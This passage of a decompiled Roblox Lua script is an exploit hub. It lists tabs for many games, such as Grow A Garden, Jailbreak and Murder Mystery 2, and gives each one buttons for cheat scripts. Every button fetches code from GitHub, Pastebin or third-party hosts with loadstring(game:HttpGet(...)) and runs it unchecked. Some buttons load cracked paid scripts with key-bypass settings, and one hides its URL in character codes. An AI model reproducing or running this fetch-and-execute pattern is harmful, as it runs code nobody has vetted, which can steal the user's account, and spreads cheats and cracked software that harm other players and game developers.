          loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
        end,
      })
      r88_4:AddButton({
        Name = "Spimine Hub",
        Callback = function()
          -- line: [0, 0] id: 577
          loadstring(game:HttpGet("https://raw.githubusercontent.com/antisocialb2/SPIMINE-FLEETHEFACILITY/main/script.lua"))()
        end,
      })
      r88_4:AddButton({
        Name = "Flee The Facility Script",
        Callback = function()
          -- line: [0, 0] id: 534
          loadstring(game:HttpGet("https://pastebin.com/raw/1GEWA6th"))()
        end,
      })
      local r89_4 = r4_4:MakeTab({
        Name = "Fling Things And Peoples",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r89_4:AddButton({
        Name = "VHS V6 Premium Crack (Very Good Script)",
        Callback = function()
          -- line: [0, 0] id: 506
          loadstring(game:HttpGet("https://you.whimper.xyz/vhs.lua"))()
        end,
      })
      r89_4:AddButton({
        Name = "Blitz Hub (Also Very Good)",
        Callback = function()
          -- line: [0, 0] id: 574
          loadstring(game:HttpGet("https://you.whimper.xyz/blitz"))()
        end,
      })
      r89_4:AddButton({
        Name = "Verbal Hub",
        Callback = function()
          -- line: [0, 0] id: 397
          loadstring(game:HttpGet("https://raw.githubusercontent.com/VerbalHubz/Verbal-Hub/main/Verbalhub.lua", true))()
        end,
      })
      r89_4:AddButton({
        Name = "Unknown FTAP",
        Callback = function()
          -- line: [0, 0] id: 272
          loadstring(game:HttpGet("https://pastebin.com/raw/Skn3Aa1Q", true))()
        end,
      })
      local r90_4 = r4_4:MakeTab({
        Name = "Football Fusion 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r90_4:AddButton({
        Name = "Atlas Hub",
        Callback = function()
          -- line: [0, 0] id: 363
          getgenv().dontoffline = false
          _G.AtlasHubSafeMode = false
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/atlas"))()
        end,
      })
      r90_4:AddButton({
        Name = "Yon Hub",
        Callback = function()
          -- line: [0, 0] id: 462
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/50e0afd6882f216952ad6cd641fd0b24.lua"))()
        end,
      })
      r90_4:AddButton({
        Name = "Ishii.lol",
        Callback = function()
          -- line: [0, 0] id: 598
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/7b4f22e1726966f40c91521aaeb11953.lua"))()
        end,
      })
      local r91_4 = r4_4:MakeTab({
        Name = "Frontlines",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r91_4:AddButton({
        Name = "Waza Hub",
        Callback = function()
          -- line: [0, 0] id: 319
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/WazaFrontlines"))()
        end,
      })
      r91_4:AddButton({
        Name = "Forge Hub",
        Callback = function()
          -- line: [0, 0] id: 686
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/loader.lua"))()
        end,
      })
      r91_4:AddButton({
        Name = "Pinguin Hub",
        Callback = function()
          -- line: [0, 0] id: 640
          loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 80, 85, 83, 67, 82, 73, 80, 84, 83, 47, 80, 73, 78, 71, 85, 73, 78, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 80, 105, 110, 103, 117, 105, 110, 72, 117, 98)))()
        end,
      })
      local r92_4 = r4_4:MakeTab({
        Name = "Funky Friday",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r92_4:AddButton({
        Name = "Uni Hub",
        Callback = function()
          -- line: [0, 0] id: 111
          loadstring(game:HttpGet("https://pastebin.com/raw/dcyuEgyK"))()
        end,
      })
      r92_4:AddButton({
        Name = "Auto Player",
        Callback = function()
          -- line: [0, 0] id: 338
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadir3709/ScriptHub/main/Loader"))()
        end,
      })
      local r93_4 = r4_4:MakeTab({
        Name = "Flag Wars",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r93_4:AddButton({
        Name = "Kill All",
        Callback = function()
          -- line: [0, 0] id: 203
          loadstring(game:HttpGet("https://raw.githubusercontent.com/kylosilly/femboyware/refs/heads/main/FlagWarsKillAll.lua"))()
        end,
      })
      r93_4:AddButton({
        Name = "Rinns Hub",
        Callback = function()
          -- line: [0, 0] id: 326
          loadstring(game:HttpGet("https://raw.githubusercontent.com/R1nn1/MainMenu1/main/MainMenuV1.2"))()
        end,
      })
      local r94_4 = r4_4:MakeTab({
        Name = "Find Buttons!",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r94_4:AddButton({
        Name = "Kaito Hub",
        Callback = function()
          -- line: [0, 0] id: 596
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaitofyp/Find-Buttons-/refs/heads/main/Op%20script"))()
        end,
      })
      r94_4:AddButton({
        Name = "Buttons ESP",
        Callback = function()
          -- line: [0, 0] id: 44
          loadstring(game:HttpGet("https://pastebin.com/raw/SvTyxCkN"))()
        end,
      })
      local r95_4 = r4_4:MakeTab({
        Name = "Fishing Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r95_4:AddButton({
        Name = "Fishing Simulator Script",
        Callback = function()
          -- line: [0, 0] id: 429
          loadstring(game:HttpGet("https://pastebin.com/raw/1i6jksLM"))()
        end,
      })
      r95_4:AddButton({
        Name = "Marco Hub",
        Callback = function()
          -- line: [0, 0] id: 237
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/refs/heads/main/fishing", true))()
        end,
      })
      r4_4:MakeTab({
        Name = "Feet Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Feet Simulator Script",
        Callback = function()
          -- line: [0, 0] id: 717
          loadstring(game:HttpGet("https://pastebin.com/raw/jtLYTQmg"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Fight In A School",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Dep Hub",
        Callback = function()
          -- line: [0, 0] id: 30
          loadstring(game:HttpGet("https://rawscripts.net/raw/VC-+-NEW-STYLES-fight-in-a-school-Dope-Hub-14582"))()
        end,
      })
      local r98_4 = r4_4:MakeTab({
        Name = "Grow A Garden",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      local r99_4 = r98_4:AddSection({
        Name = "Keyless Scripts",
      })
      r98_4:AddButton({
        Name = "Speed Hub X (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 669
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
        end,
      })
      r98_4:AddButton({
        Name = "OP Script",
        Callback = function()
          -- line: [0, 0] id: 360
          loadstring(game:HttpGet("https://raw.githubusercontent.com/tesghg/Grow-a-Garden/main/ameicaa_Grow_A_Garden.lua"))()
        end,
      })
      r98_4:AddButton({
        Name = "No-Lag Hub",
        Callback = function()
          -- line: [0, 0] id: 60
          loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
        end,
      })
      r98_4:AddButton({
        Name = "Tbao Hub",
        Callback = function()
          -- line: [0, 0] id: 29
          loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/refs/heads/main/TbaoHubGrowGarden"))()
        end,
      })
      r98_4:AddButton({
        Name = "Tora Hub",
        Callback = function()
          -- line: [0, 0] id: 654
          loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/GrowaGarden"))()
        end,
      })
      r98_4:AddButton({
        Name = "Mercenaries Hub",
        Callback = function()
          -- line: [0, 0] id: 545
          loadstring(game:HttpGet("https://raw.githubusercontent.com/kosowa/asd/refs/heads/main/GaG.lua"))()
        end,
      })
      r98_4:AddButton({
        Name = "Kenniel Hub",
        Callback = function()
          -- line: [0, 0] id: 601
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenniel123/Grow-a-garden/refs/heads/main/Grow%20A%20Garden"))()
        end,
      })
      r98_4:AddButton({
        Name = "Beecon Hub",
        Callback = function()
          -- line: [0, 0] id: 247
          loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeconHub/main/BeeconHub"))()
        end,
      })
      r98_4:AddButton({
        Name = "Vermz Hub (Crack)",
        Callback = function()
          -- line: [0, 0] id: 366
          getgenv().UseKey = "25ms"
          getgenv().AllowAnyKey = false
          loadstring(game:HttpGet("http://you.whimper.xyz/PandaSVAL.lua"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Vermzky/VermzHub/refs/heads/main/FREE"))()
        end,
      })
      r98_4:AddButton({
        Name = "Ronix Hub",
        Callback = function()
          -- line: [0, 0] id: 350
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a8f02a61fc38bf9256dd0f17be6b16d7.lua"))()
        end,
      })
      local r100_4 = r98_4:AddSection({
        Name = "Scripts With Key System",
      })
      r98_4:AddButton({
        Name = "Native Hub",
        Callback = function()
          -- line: [0, 0] id: 542
          script_key = "PASTEKEYHERE"
          (loadstring or load)(game:HttpGet("https://getnative.cc/script/loader"))()
        end,
      })
      r98_4:AddButton({
        Name = "Forge Hub",
        Callback = function()
          -- line: [0, 0] id: 171
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/loader.lua"))()
        end,
      })
      r98_4:AddButton({
        Name = "Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 620
          loadstring(game:HttpGet(request({
            Url = "https://aussie.productions/script",
          }).Body))()
        end,
      })
      r98_4:AddButton({
        Name = "Ather Hub",
        Callback = function()
          -- line: [0, 0] id: 394
          script_key = "Add key here to auto verify"
          loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/2529a5f9dfddd5523ca4e22f21cceffa.lua"))()
        end,
      })
      local r101_4 = r4_4:MakeTab({
        Name = "Grand Piece Online",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r101_4:AddButton({
        Name = "Arpon Hub",
        Callback = function()
          -- line: [0, 0] id: 323
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ArponAG/Scripts/main/gpo.lua", true))()
        end,
      })
      r101_4:AddButton({
        Name = "Vamp Hub",
        Callback = function()
          -- line: [0, 0] id: 561
          loadstring(game:HttpGet("https://vamphub.xyz/free.lua"))()
        end,
      })
      r101_4:AddLabel("Key: VAMP983")
      local r102_4 = r4_4:MakeTab({
        Name = "Gym League",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r102_4:AddButton({
        Name = "Speed Hub X",
        Callback = function()
          -- line: [0, 0] id: 470
          loadstring(game:HttpGet("https://scriptblox.com/raw/Gym-League-Speed-hub-NO-KEY-14879"))()
        end,
      })
      r102_4:AddButton({
        Name = "Cats Hub",
        Callback = function()
          -- line: [0, 0] id: 154
          loadstring(game:HttpGet("https://raw.githubusercontent.com/afyzone/lua/refs/heads/main/Gym%20League/gui.lua"))()
        end,
      })
      local r103_4 = r4_4:MakeTab({
        Name = "Gunfight Arena",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r103_4:AddButton({
        Name = "Bacon Boss Scripts",
        Callback = function()
          -- line: [0, 0] id: 334
          loadstring(game:HttpGet("https://pastefy.app/FL5mxhtj/raw", true))()
        end,
      })
      r103_4:AddButton({
        Name = "Weapon Customizer",
        Callback = function()
          -- line: [0, 0] id: 228
          loadstring(game:HttpGet("https://raw.githubusercontent.com/h8h88/gunfight/refs/heads/main/fuckpaidscripts"))()
        end,
      })
      r103_4:AddButton({
        Name = "Rinns Hub",
        Callback = function()
          -- line: [0, 0] id: 443
          loadstring(game:HttpGet("https://raw.githubusercontent.com/R1nn1/MainMenu1/main/MainMenuV1.2"))()
        end,
      })
      local r104_4 = r4_4:MakeTab({
        Name = "Gun Grounds FFA",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r104_4:AddButton({
        Name = "Gun Grounds FFA Script",
        Callback = function()
          -- line: [0, 0] id: 127
          loadstring(game:HttpGet("https://pastebin.com/raw/rf8zaVmE", true))()
        end,
      })
      r104_4:AddButton({
        Name = "DynaHub",
        Callback = function()
          -- line: [0, 0] id: 593
          loadstring(game:HttpGet("https://pastebin.com/raw/5CcWsr2w"))()
        end,
      })
      r104_4:AddButton({
        Name = "Good Script",
        Callback = function()
          -- line: [0, 0] id: 777
          loadstring(game:HttpGet("https://raw.githubusercontent.com/agresiv111/script/refs/heads/main/main.lua"))()
        end,
      })
      local r105_4 = r4_4:MakeTab({
        Name = "Gojo Vs Toji Ability Test",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r105_4:AddButton({
        Name = "Budgie Hub",
        Callback = function()
          -- line: [0, 0] id: 764
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Wolfdmitrich/gojovstoji/main/main.lua"))()
        end,
      })
      r105_4:AddButton({
        Name = "Good Script",
        Callback = function()
          -- line: [0, 0] id: 65
          loadstring(game:HttpGet("https://pastebin.com/raw/XBFwNwbT"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Game Store Tycoon",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Get Money",
        Callback = function()
          -- line: [0, 0] id: 689
          loadstring(game:HttpGet("https://pastebin.com/raw/SuN8KQxv"))()
        end,
      })
      local r107_4 = r4_4:MakeTab({
        Name = "Goal Kick Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r107_4:AddButton({
        Name = "Apple Scripts",
        Callback = function()
          -- line: [0, 0] id: 243
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AppleScript001/Goal-Kick-Simulator/main/README.md", true))()
        end,
      })
      r107_4:AddButton({
        Name = "Goal Kick Simulator Script",
        Callback = function()
          -- line: [0, 0] id: 13
          loadstring(game:HttpGet("https://github.com/KhSaeed90/Roblox/raw/workspace/9281034297"))()
        end,
      })
      local r108_4 = r4_4:MakeTab({
        Name = "Hide And Seek Extreme",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r108_4:AddButton({
        Name = "Tbao Hub",
        Callback = function()
          -- line: [0, 0] id: 731
          loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubHideandSeek"))()
        end,
      })
      r108_4:AddButton({
        Name = "Hide And Seek Extreme Script",
        Callback = function()
          -- line: [0, 0] id: 298
          loadstring(game:HttpGet("https://pastebin.com/raw/CHdnsmC7"))()
        end,
      })
      r108_4:AddButton({
        Name = "Sky Hub",
        Callback = function()
          -- line: [0, 0] id: 672
          loadstring(game:HttpGet("https://scriptblox.com/raw/Hide-and-Seek-Extreme-Tag-all-12365"))()
        end,
      })
      r108_4:AddButton({
        Name = "Anthony Davis Hub",
        Callback = function()
          -- line: [0, 0] id: 129
          loadstring(game:HttpGet("https://katerhub-inc.github.io/scripts/game/hideandseek.lua"))()
        end,
      })
      local r109_4 = r4_4:MakeTab({
        Name = "Horrific Housing",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r109_4:AddButton({
        Name = "V3rg Hub",
        Callback = function()
          -- line: [0, 0] id: 238
          loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/HH-loader/main/HH%20loader0"))()
        end,
      })
      r109_4:AddButton({
        Name = "Vadrifts Hub",
        Callback = function()
          -- line: [0, 0] id: 475
          loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Vadrifts-Horrific-Housing.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Infectious Smile",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Infectious Smile GUI",
        Callback = function()
          -- line: [0, 0] id: 416
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/SmileGUI/main/SmileHax33"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Impossible Obby",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Auto Passing Lvls",
        Callback = function()
          -- line: [0, 0] id: 522
          loadstring(game:HttpGet("https://pastebin.com/raw/EjkD5nTT"))()
        end,
      })
      local r112_4 = r4_4:MakeTab({
        Name = "Impossible Squid Game! Glass Bridge 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r112_4:AddButton({
        Name = "Autofarm Money",
        Callback = function()
          -- line: [0, 0] id: 275
          loadstring(game:HttpGet("https://pastebin.com/raw/Tna4VT9Z"))()
        end,
      })
      r112_4:AddButton({
        Name = "Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 340
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/GlassBridge.lua"))()
        end,
      })
      r112_4:AddButton({
        Name = "Sonder Hub",
        Callback = function()
          -- line: [0, 0] id: 683
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Sonder-hub/SonderUI/main/Main"))()
        end,
      })
      local r113_4 = r4_4:MakeTab({
        Name = "Jujutsu Shenanigans",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r113_4:AddButton({
        Name = "Freaky Ware",
        Callback = function()
          -- line: [0, 0] id: 677
          loadstring(game:HttpGet("https://raw.githubusercontent.com/KaisGithubD/freakyware3/main/FreakyWare%20JJS", true))()
        end,
      })
      r113_4:AddButton({
        Name = "NS Hub",
        Callback = function()
          -- line: [0, 0] id: 176
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/JJS/main/Solara"))()
        end,
      })
      local r114_4 = r4_4:MakeTab({
        Name = "Jailbreak",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r114_4:AddButton({
        Name = "Aoi Hub",
        Callback = function()
          -- line: [0, 0] id: 751
          loadstring(game:HttpGet("https://raw.githubusercontent.com/zyn789/Aoi-Script/main/Jailbreak"))()
        end,
      })
      r114_4:AddButton({
        Name = "Project Auto - Auto Rob (Use on private or small servers!)",
        Callback = function()
          -- line: [0, 0] id: 310
          loadstring(game:HttpGet("http://scripts.projectauto.xyz/AutoRobV5"))()
        end,
      })
      r114_4:AddButton({
        Name = "No Fall Damage - ÐÐµ Ð¿Ð¾Ð»ÑÑÐ°ÑÑ ÑÑÐ¾Ð½ Ð¾Ñ Ð¿Ð°Ð´ÐµÐ½Ð¸Ñ",
        Callback = function()
          -- line: [0, 0] id: 531
          loadstring(game:HttpGet("https://pastebin.com/raw/eqra3FRi"))()
        end,
      })
      local r115_4 = r4_4:MakeTab({
        Name = "King Legacy",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r115_4:AddButton({
        Name = "Arc Hub",
        Callback = function()
          -- line: [0, 0] id: 31
          loadstring(game:HttpGet("https://pastebin.com/raw/spQB0iJu"))()
        end,
      })
      r115_4:AddButton({
        Name = "TC Hub",
        Callback = function()
          -- line: [0, 0] id: 517
          loadstring(game:HttpGet("https://you.whimper.xyz/tchub"))()
        end,
      })
      local r116_4 = r4_4:MakeTab({
        Name = "KAT",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r116_4:AddButton({
        Name = "Beluga Ware",
        Callback = function()
          -- line: [0, 0] id: 446
          loadstring(game:HttpGet("https://raw.githubusercontent.com/scripter1cursed1rade/BelugaWare-1.4/main/belugaware.lua"))()
        end,
      })
      r116_4:AddButton({
        Name = "King Hub",
        Callback = function()
          -- line: [0, 0] id: 9
          pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/zReal-King/Knife-Ability-Test/main/Gui")))
        end,
      })
      r116_4:AddButton({
        Name = "KAT Plus",
        Callback = function()
          -- line: [0, 0] id: 37
          loadstring(game:HttpGet("https://raw.githubusercontent.com/NaikoScript/Kat-Plus/main/Script"))()
        end,
      })
      local r117_4 = r4_4:MakeTab({
        Name = "KJ Arena",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r117_4:AddButton({
        Name = "Budgie Hub",
        Callback = function()
          -- line: [0, 0] id: 80
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Wolfdmitrich/kjarena/main/kjarena.lua"))()
        end,
      })
      r117_4:AddButton({
        Name = "Fly (activate with button E)",
        Callback = function()
          -- line: [0, 0] id: 57
          loadstring(game:HttpGet("https://pastebin.com/raw/cTFDwAP2"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Kaizen Battlegrounds",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Bird Hub",
        Callback = function()
          -- line: [0, 0] id: 245
          loadstring(game:HttpGet("https://raw.githubusercontent.com/intentparrot392/scripts/refs/heads/main/Kaizenbattlegroundfcker"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Launch Into Space Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Kitty Hub",
        Callback = function()
          -- line: [0, 0] id: 93
          loadstring(game:HttpGet("https://whimper.xyz/cathub.lua"))()
        end,
      })
      local r120_4 = r4_4:MakeTab({
        Name = "Legends Of Speed",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r120_4:AddButton({
        Name = "Vynixius Hub (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 68
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Legends%20Of%20Speed/Script.lua"))()
        end,
      })
      r120_4:AddButton({
        Name = "Sim Hub",
        Callback = function()
          -- line: [0, 0] id: 546
          loadstring(game:HttpGet("https://pastebin.com/raw/E1Kp2r3Y"))()
        end,
      })
      r120_4:AddButton({
        Name = "Ywxo Hub",
        Callback = function()
          -- line: [0, 0] id: 372
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ywxoofc/specifier/refs/heads/main/1119466531.lua"))()
        end,
      })
      r120_4:AddButton({
        Name = "Legends Of Speed GUI",
        Callback = function()
          -- line: [0, 0] id: 359
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ReeAndArceus/Legends-Of-Speed-Gui/main/Gui"))()
        end,
      })
      r120_4:AddButton({
        Name = "Plutonium Hub",
        Callback = function()
          -- line: [0, 0] id: 697
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
        end,
      })
      r120_4:AddButton({
        Name = "Project Omega",
        Callback = function()
          -- line: [0, 0] id: 486
          loadstring(game:HttpGet("https://raw.githubusercontent.com/TheScriptPirate/ProjectOmega/main/ProjectOmegaLoader.lua"))()
        end,
      })
      local r121_4 = r4_4:MakeTab({
        Name = "Lucky Blocks Battlegrounds",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r121_4:AddButton({
        Name = "Inf Galaxy Block",
        Callback = function()
          -- line: [0, 0] id: 779
          loadstring(game:HttpGet("https://pastebin.com/raw/4TXm0NCk"))()
        end,
      })
      r121_4:AddButton({
        Name = "Plutonium Hub",
        Callback = function()
          -- line: [0, 0] id: 291
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
        end,
      })
      r4_4:MakeTab({
        Name = "Lumber Tycoon 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Kron Hub",
        Callback = function()
          -- line: [0, 0] id: 295
          loadstring(game:HttpGet("https://raw.githubusercontent.com/DevKron/Kron_Hub/refs/heads/main/version_1.0"))("")
        end,
      })
      local r123_4 = r4_4:MakeTab({
        Name = "Lifting Legends Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r123_4:AddButton({
        Name = "Inf Strength",
        Callback = function()
          -- line: [0, 0] id: 652
          loadstring(game:HttpGet("https://pastebin.com/raw/5MDx7bSP"))()
        end,
      })
      r123_4:AddButton({
        Name = "Moma Hub",
        Callback = function()
          -- line: [0, 0] id: 317
          loadstring(game:HttpGet("https://raw.githubusercontent.com/moma1133222/script/refs/heads/main/Lifting%20Legends%20Simulator"))()
        end,
      })
      local r124_4 = r4_4:MakeTab({
        Name = "Lifting Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r124_4:AddButton({
        Name = "Sky Hub",
        Callback = function()
          -- line: [0, 0] id: 412
          loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
        end,
      })
      r124_4:AddButton({
        Name = "Lifting Simulator Script",
        Callback = function()
          -- line: [0, 0] id: 562
          loadstring(game:HttpGet("https://pastebin.com/raw/scUj7fmz"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Lost Souls",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "NS Hub",
        Callback = function()
          -- line: [0, 0] id: 505
          getgenv().UseKey = "25ms"
          getgenv().KeyMode = nil
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/ls/refs/heads/main/1st"))()
        end,
      })
      local r126_4 = r4_4:MakeTab({
        Name = "Murder Mystery 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r126_4:AddButton({
        Name = "X-Hub",
        Callback = function()
          -- line: [0, 0] id: 299
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
        end,
      })
      r126_4:AddButton({
        Name = "Foggy Hub",
        Callback = function()
          -- line: [0, 0] id: 382
          loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/mm2-piano-reborn/refs/heads/main/scr"))()
        end,
      })
      r126_4:AddButton({
        Name = "Y-HUB",
        Callback = function()
          -- line: [0, 0] id: 498
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Luarmor123/YHUB-Community/refs/heads/main/Murder-Mystery2"))()
        end,
      })
      r126_4:AddButton({
        Name = "Vertex Hub",
        Callback = function()
          -- line: [0, 0] id: 7
          loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
        end,
      })
      r126_4:AddButton({
        Name = "Highlight Hub",
        Callback = function()
          -- line: [0, 0] id: 753
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Lite"))()
        end,
      })
      r126_4:AddButton({
        Name = "YARHM Hub",
        Callback = function()
          -- line: [0, 0] id: 345
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/source/yarhm/1.18/yarhm.lua"))()
        end,
      })
      r126_4:AddButton({
        Name = "Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 567
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      r126_4:AddButton({
        Name = "Express Hub",
        Callback = function()
          -- line: [0, 0] id: 262
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      local r127_4 = r4_4:MakeTab({
        Name = "Murderers Vs Sheriffs Duels",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r127_4:AddButton({
        Name = "Tbao Hub",
        Callback = function()
          -- line: [0, 0] id: 316
          loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubMurdervssheriff"))()
        end,
      })
      r127_4:AddButton({
        Name = "Konger Hub",
        Callback = function()
          -- line: [0, 0] id: 351
          loadstring(game:GetObjects("rbxassetid://14713089094")[1].Source)()
        end,
      })
      local r128_4 = r4_4:MakeTab({
        Name = "Muscle Legends",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r128_4:AddButton({
        Name = "Speed Hub X",
        Callback = function()
          -- line: [0, 0] id: 94
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
        end,
      })
      r128_4:AddButton({
        Name = "Very Good Script",
        Callback = function()
          -- line: [0, 0] id: 608
          loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/Loader"))()
        end,
      })
      r128_4:AddButton({
        Name = "Plutonium Hub",
        Callback = function()
          -- line: [0, 0] id: 74
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
        end,
      })
      local r129_4 = r4_4:MakeTab({
        Name = "Mic Up",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r129_4:AddButton({
        Name = "Sky Hub",
        Callback = function()
          -- line: [0, 0] id: 378
          loadstring(game:HttpGet("https://scriptblox.com/raw/3008-2.73-teleport-to-player-worker-esp-grab-food-no-fall-damage-12949"))()
        end,
      })
      r129_4:AddButton({
        Name = "Kitty Hub",
        Callback = function()
          -- line: [0, 0] id: 348
          loadstring(game:HttpGet("https://whimper.xyz/kitty"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Motorcycle Race",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Motorcycle Race Script",
        Callback = function()
          -- line: [0, 0] id: 424
